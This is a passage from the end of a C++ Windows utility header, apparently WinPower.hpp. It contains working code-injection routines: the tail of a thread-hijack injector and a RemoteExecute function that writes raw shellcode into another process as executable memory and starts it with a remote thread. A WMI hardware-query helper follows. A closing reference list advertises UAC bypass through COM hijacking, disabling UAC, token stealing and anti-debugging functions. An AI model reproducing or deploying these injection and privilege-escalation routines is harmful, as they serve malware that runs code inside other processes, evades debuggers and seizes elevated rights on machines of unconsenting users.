        WriteProcessMemory(hp, reinterpret_cast<LPVOID>(ctx.Esp), &pathAddr, sizeof(DWORD), nullptr);
#endif
        SetThreadContext(ht, &ctx);
        ResumeThread(ht);
        ::Sleep(200); // give it time to load

        CloseHandle(ht);
        CloseHandle(hp);
        return true;
    }

    /// Execute raw shellcode in a remote process. !! EXTREMELY DANGEROUS !!
    inline bool RemoteExecute(DWORD pid, const std::vector<BYTE>& shellcode) {
        Ownership::_EnablePrivilege(SE_DEBUG_NAME);
        HANDLE hp=OpenProcess(PROCESS_ALL_ACCESS,FALSE,pid); if(!hp) return false;
        LPVOID mem=VirtualAllocEx(hp,nullptr,shellcode.size(),
            MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);
        if(!mem){CloseHandle(hp);return false;}
        WriteProcessMemory(hp,mem,shellcode.data(),shellcode.size(),nullptr);
        HANDLE ht=CreateRemoteThread(hp,nullptr,0,
            reinterpret_cast<LPTHREAD_START_ROUTINE>(mem),nullptr,0,nullptr);
        bool ok=ht!=nullptr;
        if(ht){WaitForSingleObject(ht,10000);CloseHandle(ht);}
        VirtualFreeEx(hp,mem,0,MEM_RELEASE); CloseHandle(hp); return ok;
    }

} // namespace Inject

// ============================================================
//  SECTION P12 — WMI Quick Queries
// ============================================================
//  Kept here for projects that only include WinPower.hpp
//  For full hardware info use WinHardware.hpp instead.
// ============================================================
namespace WMI {

    struct WMIResult {
        std::vector<std::map<std::string,std::string>> rows;
        bool success = false;
    };

    inline WMIResult Query(const std::string& wql,
                            const std::vector<std::string>& props = {}) {
        WMIResult result;
        CoInitializeEx(nullptr, COINIT_MULTITHREADED);
        CoInitializeSecurity(nullptr,-1,nullptr,nullptr,
            RPC_C_AUTHN_LEVEL_DEFAULT,RPC_C_IMP_LEVEL_IMPERSONATE,
            nullptr,EOAC_NONE,nullptr);
        IWbemLocator* pLoc=nullptr;
        if(FAILED(CoCreateInstance(CLSID_WbemLocator,nullptr,CLSCTX_INPROC_SERVER,
            IID_IWbemLocator,reinterpret_cast<void**>(&pLoc)))) return result;
        IWbemServices* pSvc=nullptr;
        if(FAILED(pLoc->ConnectServer(_bstr_t(L"ROOT\\CIMV2"),nullptr,nullptr,
            nullptr,0,nullptr,nullptr,&pSvc))){pLoc->Release();return result;}
        CoSetProxyBlanket(pSvc,RPC_C_AUTHN_WINNT,RPC_C_AUTHZ_NONE,nullptr,
            RPC_C_AUTHN_LEVEL_CALL,RPC_C_IMP_LEVEL_IMPERSONATE,nullptr,EOAC_NONE);
        IEnumWbemClassObject* pEnum=nullptr;
        if(FAILED(pSvc->ExecQuery(_bstr_t(L"WQL"),
            _bstr_t(Str::ToWide(wql).c_str()),
            WBEM_FLAG_FORWARD_ONLY|WBEM_FLAG_RETURN_IMMEDIATELY,
            nullptr,&pEnum))){pSvc->Release();pLoc->Release();return result;}
        IWbemClassObject* pObj=nullptr; ULONG ret=0;
        while(pEnum->Next(WBEM_INFINITE,1,&pObj,&ret)==S_OK){
            std::map<std::string,std::string> row;
            auto tryProp=[&](const std::string& p){
                VARIANT v; VariantInit(&v);
                if(SUCCEEDED(pObj->Get(Str::ToWide(p).c_str(),0,&v,nullptr,nullptr))){
                    if(v.vt==VT_BSTR) row[p]=Str::ToNarrow(v.bstrVal?v.bstrVal:L"");
                    else if(v.vt==VT_I4||v.vt==VT_UI4) row[p]=std::to_string(v.lVal);
                    else if(v.vt==VT_BOOL) row[p]=v.boolVal?"true":"false";
                    else{VARIANT s;VariantInit(&s);
                        if(SUCCEEDED(VariantChangeType(&s,&v,0,VT_BSTR)))
                            row[p]=Str::ToNarrow(s.bstrVal?s.bstrVal:L"");
                        VariantClear(&s);}
                } VariantClear(&v);
            };
            if(props.empty()){
                SAFEARRAY* pN=nullptr;
                pObj->GetNames(nullptr,WBEM_FLAG_ALWAYS,nullptr,&pN);
                if(pN){long lb=0,ub=0;
                    SafeArrayGetLBound(pN,1,&lb);SafeArrayGetUBound(pN,1,&ub);
                    for(long i=lb;i<=ub;++i){BSTR n=nullptr;
                        SafeArrayGetElement(pN,&i,&n);
                        if(n)tryProp(Str::ToNarrow(n));SysFreeString(n);}
                    SafeArrayDestroy(pN);}
            } else for(auto& p:props) tryProp(p);
            result.rows.push_back(row); pObj->Release();
        }
        pEnum->Release();pSvc->Release();pLoc->Release();
        result.success=true; return result;
    }

    inline std::string GetCPUName()      { auto r=Query("SELECT Name FROM Win32_Processor",{"Name"}); return r.rows.empty()?"":r.rows[0]["Name"]; }
    inline std::string GetGPUName()      { auto r=Query("SELECT Name FROM Win32_VideoController",{"Name"}); return r.rows.empty()?"":r.rows[0]["Name"]; }
    inline std::string GetBIOSVersion()  { auto r=Query("SELECT SMBIOSBIOSVersion FROM Win32_BIOS",{"SMBIOSBIOSVersion"}); return r.rows.empty()?"":r.rows[0]["SMBIOSBIOSVersion"]; }
    inline std::string GetWindowsSerial(){ auto r=Query("SELECT SerialNumber FROM Win32_OperatingSystem",{"SerialNumber"}); return r.rows.empty()?"":r.rows[0]["SerialNumber"]; }
    inline double GetTotalRAM_GB() {
        auto r=Query("SELECT TotalPhysicalMemory FROM Win32_ComputerSystem",{"TotalPhysicalMemory"});
        if(!r.rows.empty()) try{return std::stod(r.rows[0]["TotalPhysicalMemory"])/(1024.0*1024*1024);}catch(...){}
        return 0.0;
    }
    inline std::vector<std::string> GetDiskDrives() {
        auto r=Query("SELECT Model FROM Win32_DiskDrive",{"Model"});
        std::vector<std::string> v; for(auto& row:r.rows) v.push_back(row["Model"]); return v;
    }
    inline std::pair<std::string,std::string> GetMotherboard() {
        auto r=Query("SELECT Manufacturer,Product FROM Win32_BaseBoard",{"Manufacturer","Product"});
        return r.rows.empty()?std::make_pair(std::string{},std::string{}):
            std::make_pair(r.rows[0]["Manufacturer"],r.rows[0]["Product"]);
    }
    inline std::vector<std::string> GetMACAddresses() {
        auto r=Query("SELECT MACAddress FROM Win32_NetworkAdapter WHERE MACAddress IS NOT NULL",{"MACAddress"});
        std::vector<std::string> v;
        for(auto& row:r.rows) if(!row["MACAddress"].empty()) v.push_back(row["MACAddress"]);
        return v;
    }

} // namespace WMI

} // namespace WinUtils

#endif // WIN_POWER_HPP

// ============================================================
//  QUICK REFERENCE — WinPower.hpp
// ============================================================
//
//  Ownership::   TakeOwnershipFile/Key, GrantFullControlFile/Key,
//                UnlockFileForEveryone, GetFileOwner,
//                EnablePrivilege, ListPrivileges, IsElevated,
//                GetIntegrityLevelStr
//
//  Admin::       ForceRunAsAdmin, RelaunchElevated, RunElevated,
//                DisableUAC(!), EnableUAC, SetUACLevel,
//                BypassUACComHijack(!), SetRequireAdminFlag
//
//  Service::     Exists, GetState, Start, Stop, Pause, Resume,
//                Install, Uninstall, SetStartType,
//                InstallAndStart, ListAll
//
//  ProcessCtrl:: Suspend, Resume, CreateSuspended,
//                GetEntryPoint, WaitAndGetExitCode,
//                SetPriority, SetAffinity
//
//  Token::       StealFromProcess(!), StealFromProcessName(!),
//                Impersonate, RevertImpersonation,
//                CreateProcessWithToken, GetTokenUsername,
//                IsSystemToken
//
//  Memory::      Read, Write, ReadT, WriteT,
//                ReadString, ReadWString, WriteString,
//                Alloc, Free, Protect,
//                EnumerateRegions, FindPattern, FindPatternAll,
//                DumpRegion, GetModuleBase, ListModules
//
//  AntiDebug::   IsDebuggerPresent, IsRemoteDebugger,
//                CheckHeapFlags, CheckNtGlobalFlag,
//                CheckHardwareBreakpoints, CheckParentProcess,
//                CheckExceptionHandler,
//                HideFromDebugger, BlockDebuggerAttach,
//                AnyDebuggerDetected, TriggerIfDebugged
//
//  Inject::      InjectDLL, EjectDLL, HijackThread(!),
//                RemoteExecute(!!)
//
//  WMI::         Query, GetCPUName, GetGPUName, GetBIOSVersion,
//                GetWindowsSerial, GetTotalRAM_GB,
//                GetDiskDrives, GetMotherboard, GetMACAddresses
//
// ============================================================